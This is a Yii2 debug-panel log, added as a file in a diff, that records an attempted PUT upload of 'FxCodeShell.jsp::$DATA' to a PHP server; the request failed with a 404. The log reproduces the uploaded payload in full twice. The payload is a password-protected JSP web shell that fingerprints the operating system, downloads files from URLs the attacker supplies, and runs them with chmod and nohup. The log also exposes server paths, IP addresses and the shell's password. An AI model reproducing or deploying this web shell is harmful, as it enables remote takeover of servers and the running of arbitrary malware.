@@ -1,0 +1,242 @@
+a:9:{s:6:"config";a:5:{s:10:"phpVersion";s:6:"7.0.32";s:10:"yiiVersion";s:6:"2.0.11";s:11:"application";a:5:{s:3:"yii";s:6:"2.0.11";s:4:"name";s:14:"My Application";s:7:"version";s:3:"1.0";s:3:"env";s:3:"dev";s:5:"debug";b:1;}s:3:"php";a:5:{s:7:"version";s:6:"7.0.32";s:6:"xdebug";b:0;s:3:"apc";b:0;s:8:"memcache";b:0;s:9:"memcached";b:1;}s:10:"extensions";a:5:{s:24:"yiisoft/yii2-swiftmailer";a:3:{s:4:"name";s:24:"yiisoft/yii2-swiftmailer";s:7:"version";s:7:"2.0.6.0";s:5:"alias";a:1:{s:16:"@yii/swiftmailer";s:58:"/home/wwwroot/default/gule/vendor/yiisoft/yii2-swiftmailer";}}s:22:"yiisoft/yii2-bootstrap";a:3:{s:4:"name";s:22:"yiisoft/yii2-bootstrap";s:7:"version";s:7:"2.0.6.0";s:5:"alias";a:1:{s:14:"@yii/bootstrap";s:56:"/home/wwwroot/default/gule/vendor/yiisoft/yii2-bootstrap";}}s:18:"yiisoft/yii2-debug";a:3:{s:4:"name";s:18:"yiisoft/yii2-debug";s:7:"version";s:7:"2.0.7.0";s:5:"alias";a:1:{s:10:"@yii/debug";s:52:"/home/wwwroot/default/gule/vendor/yiisoft/yii2-debug";}}s:16:"yiisoft/yii2-gii";a:3:{s:4:"name";s:16:"yiisoft/yii2-gii";s:7:"version";s:7:"2.0.5.0";s:5:"alias";a:1:{s:8:"@yii/gii";s:50:"/home/wwwroot/default/gule/vendor/yiisoft/yii2-gii";}}s:18:"yiisoft/yii2-faker";a:3:{s:4:"name";s:18:"yiisoft/yii2-faker";s:7:"version";s:7:"2.0.3.0";s:5:"alias";a:1:{s:10:"@yii/faker";s:52:"/home/wwwroot/default/gule/vendor/yiisoft/yii2-faker";}}}}s:7:"request";a:14:{s:7:"flashes";a:0:{}s:10:"statusCode";i:200;s:14:"requestHeaders";a:8:{s:4:"host";s:14:"119.23.239.189";s:14:"content-length";s:4:"3363";s:10:"user-agent";s:70:"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)";s:15:"accept-language";s:5:"zh-cn";s:15:"accept-encoding";s:11:"gbk, GB2312";s:6:"accept";s:37:"text/html, application/xhtml+xml, */*";s:10:"connection";s:10:"Keep-Alive";s:13:"cache-control";s:8:"no-cache";}s:15:"responseHeaders";a:2:{s:12:"X-Powered-By";s:10:"PHP/7.0.32";s:12:"Content-type";s:24:"text/html; charset=UTF-8";}s:5:"route";s:22:"FxCodeShell.jsp::$DATA";s:6:"action";N;s:12:"actionParams";N;s:11:"requestBody";a:3:{s:12:"Content Type";s:0:"";s:3:"Raw";s:3363:"<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS + "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "C:/Windows/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i++) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:" + urls[i] + "<br>");
+			out.write("<br>filename:" + fileName + "<br>");
+			out.write("<br>Size:" + urls.length + "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							+ "<br><br>");
+			File isfile = new File(path + fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path + fileName);
+					} else {
+						String chmod = "chmod 777 " + path + fileName;
+						exec.exec(chmod);
+						exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+					}
+				} catch (Exception e1) {
+					e1.printStackTrace();
+				}
+				continue;
+			}
+			URL downloadUrl = new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path + fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path + fileName);
+			} else {
+				String chmod = "chmod 777 " + path + fileName;
+				exec.exec(chmod);
+				exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+			}
+		} catch (Exception e2) {
+			e2.printStackTrace();
+		}
+	}
+%>";s:17:"Decoded to Params";a:4:{s:15:"<%@_page_import";s:2232:""java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS   "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "C:/Windows/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i  ) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:"   urls[i]   "<br>");
+			out.write("<br>filename:"   fileName   "<br>");
+			out.write("<br>Size:"   urls.length   "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							  "<br><br>");
+			File isfile = new File(path   fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path   fileName);
+					} else {
+						String chmod = "chmod 777 "   path   fileName;
+						exec.exec(chmod);
+						exec.exec("nohup "   path   fileName   " > /dev/null 2>";s:2:"1_";s:0:"";s:118:"");
+					}
+				}_catch_(Exception_e1)_{
+					e1_printStackTrace();
+				}
+				continue;
+			}
+			URL_downloadUrl_";s:912:" new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path   fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path   fileName);
+			} else {
+				String chmod = "chmod 777 "   path   fileName;
+				exec.exec(chmod);
+				exec.exec("nohup "   path   fileName   " > /dev/null 2>";s:76:"");
+			}
+		}_catch_(Exception_e2)_{
+			e2_printStackTrace();
+		}
+	}
+%>";s:0:"";}}s:6:"SERVER";a:33:{s:4:"USER";s:6:"nobody";s:4:"HOME";s:1:"/";s:9:"HTTP_HOST";s:14:"119.23.239.189";s:19:"HTTP_CONTENT_LENGTH";s:4:"3363";s:15:"HTTP_USER_AGENT";s:70:"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)";s:20:"HTTP_ACCEPT_LANGUAGE";s:5:"zh-cn";s:20:"HTTP_ACCEPT_ENCODING";s:11:"gbk, GB2312";s:11:"HTTP_ACCEPT";s:37:"text/html, application/xhtml+xml, */*";s:15:"HTTP_CONNECTION";s:10:"Keep-Alive";s:18:"HTTP_CACHE_CONTROL";s:8:"no-cache";s:15:"REDIRECT_STATUS";s:3:"200";s:11:"SERVER_NAME";s:9:"localhost";s:11:"SERVER_PORT";s:2:"80";s:11:"SERVER_ADDR";s:14:"172.18.188.116";s:11:"REMOTE_PORT";s:5:"58694";s:11:"REMOTE_ADDR";s:14:"119.23.245.241";s:15:"SERVER_SOFTWARE";s:12:"nginx/1.10.3";s:17:"GATEWAY_INTERFACE";s:7:"CGI/1.1";s:14:"REQUEST_SCHEME";s:4:"http";s:15:"SERVER_PROTOCOL";s:8:"HTTP/1.1";s:13:"DOCUMENT_ROOT";s:30:"/home/wwwroot/default/gule/web";s:12:"DOCUMENT_URI";s:10:"/index.php";s:11:"REQUEST_URI";s:23:"/FxCodeShell.jsp::$DATA";s:11:"SCRIPT_NAME";s:10:"/index.php";s:14:"CONTENT_LENGTH";s:4:"3363";s:12:"CONTENT_TYPE";s:0:"";s:14:"REQUEST_METHOD";s:3:"PUT";s:12:"QUERY_STRING";s:25:"s=/FxCodeShell.jsp::$DATA";s:15:"SCRIPT_FILENAME";s:41:"/home/wwwroot/default/gule/web//index.php";s:9:"FCGI_ROLE";s:9:"RESPONDER";s:8:"PHP_SELF";s:10:"/index.php";s:18:"REQUEST_TIME_FLOAT";d:1545358704.61832;s:12:"REQUEST_TIME";i:1545358704;}s:3:"GET";a:1:{s:1:"s";s:23:"/FxCodeShell.jsp::$DATA";}s:4:"POST";a:0:{}s:6:"COOKIE";a:0:{}s:5:"FILES";a:0:{}s:7:"SESSION";a:0:{}}s:3:"log";a:1:{s:8:"messages";a:13:{i:0;a:6:{i:0;s:33:"Bootstrap with yii\log\Dispatcher";i:1;i:8;i:2;s:31:"yii\base\Application::bootstrap";i:3;d:1545358704.6188769;i:4;a:0:{}i:5;i:855024;}i:1;a:6:{i:0;s:21:"Loading module: debug";i:1;i:8;i:2;s:26:"yii\base\Module::getModule";i:3;d:1545358704.61889;i:4;a:0:{}i:5;i:856400;}i:2;a:6:{i:0;s:44:"Bootstrap with yii\debug\Module::bootstrap()";i:1;i:8;i:2;s:31:"yii\base\Application::bootstrap";i:3;d:1545358704.6191001;i:4;a:0:{}i:5;i:978672;}i:3;a:6:{i:0;s:19:"Loading module: gii";i:1;i:8;i:2;s:26:"yii\base\Module::getModule";i:3;d:1545358704.619314;i:4;a:0:{}i:5;i:995648;}i:4;a:6:{i:0;s:42:"Bootstrap with yii\gii\Module::bootstrap()";i:1;i:8;i:2;s:31:"yii\base\Application::bootstrap";i:3;d:1545358704.6193559;i:4;a:0:{}i:5;i:1002400;}i:5;a:6:{i:0;a:3:{s:4:"rule";s:3:"gii";s:5:"match";b:0;s:6:"parent";N;}i:1;i:8;i:2;s:32:"yii\web\UrlManager::parseRequest";i:3;d:1545358704.6195109;i:4;a:0:{}i:5;i:1025040;}i:6;a:6:{i:0;a:3:{s:4:"rule";s:12:"gii/<id:\w+>";s:5:"match";b:0;s:6:"parent";N;}i:1;i:8;i:2;s:32:"yii\web\UrlManager::parseRequest";i:3;d:1545358704.6195209;i:4;a:0:{}i:5;i:1025832;}i:7;a:6:{i:0;a:3:{s:4:"rule";s:41:"gii/<controller:[\w\-]+>/<action:[\w\-]+>";s:5:"match";b:0;s:6:"parent";N;}i:1;i:8;i:2;s:32:"yii\web\UrlManager::parseRequest";i:3;d:1545358704.619529;i:4;a:0:{}i:5;i:1026664;}i:8;a:6:{i:0;a:3:{s:4:"rule";s:5:"debug";s:5:"match";b:0;s:6:"parent";N;}i:1;i:8;i:2;s:32:"yii\web\UrlManager::parseRequest";i:3;d:1545358704.6195331;i:4;a:0:{}i:5;i:1027448;}i:9;a:6:{i:0;a:3:{s:4:"rule";s:43:"debug/<controller:[\w\-]+>/<action:[\w\-]+>";s:5:"match";b:0;s:6:"parent";N;}i:1;i:8;i:2;s:32:"yii\web\UrlManager::parseRequest";i:3;d:1545358704.619539;i:4;a:0:{}i:5;i:1028600;}i:10;a:6:{i:0;s:55:"No matching URL rules. Using default URL parsing logic.";i:1;i:8;i:2;s:32:"yii\web\UrlManager::parseRequest";i:3;d:1545358704.6195419;i:4;a:0:{}i:5;i:1028976;}i:11;a:6:{i:0;s:41:"Route requested: 'FxCodeShell.jsp::$DATA'";i:1;i:8;i:2;s:34:"yii\web\Application::handleRequest";i:3;d:1545358704.619549;i:4;a:0:{}i:5;i:1028656;}i:12;a:6:{i:0;s:890:"yii\base\InvalidRouteException: Unable to resolve the request "FxCodeShell.jsp::$DATA". in /home/wwwroot/default/gule/vendor/yiisoft/yii2/base/Module.php:532
+Stack trace:
+#0 /home/wwwroot/default/gule/vendor/yiisoft/yii2/web/Application.php(102): yii\base\Module->runAction('FxCodeShell.jsp...', Array)
+#1 /home/wwwroot/default/gule/vendor/yiisoft/yii2/base/Application.php(380): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /home/wwwroot/default/gule/web/index.php(13): yii\base\Application->run()
+#3 {main}
+
+Next yii\web\NotFoundHttpException: Page not found. in /home/wwwroot/default/gule/vendor/yiisoft/yii2/web/Application.php:114
+Stack trace:
+#0 /home/wwwroot/default/gule/vendor/yiisoft/yii2/base/Application.php(380): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /home/wwwroot/default/gule/web/index.php(13): yii\base\Application->run()
+#2 {main}";i:1;i:1;i:2;s:25:"yii\web\HttpException:404";i:3;d:1545358704.619633;i:4;a:0:{}i:5;i:1119776;}}}s:9:"profiling";a:3:{s:6:"memory";i:1131752;s:4:"time";d:0.0017800331115722656;s:8:"messages";a:0:{}}s:2:"db";a:1:{s:8:"messages";a:0:{}}s:6:"assets";a:0:{}s:4:"mail";a:0:{}s:8:"timeline";a:2:{s:5:"start";d:1545358704.618453;s:3:"end";d:1545358704.6203051;}s:7:"summary";a:9:{s:3:"tag";s:13:"5c1c4d70972b9";s:3:"url";s:44:"http://119.23.239.189/FxCodeShell.jsp::$DATA";s:4:"ajax";i:0;s:6:"method";s:3:"PUT";s:2:"ip";s:14:"119.23.245.241";s:4:"time";i:1545358704;s:10:"statusCode";i:200;s:8:"sqlCount";i:0;s:9:"mailCount";i:0;}}
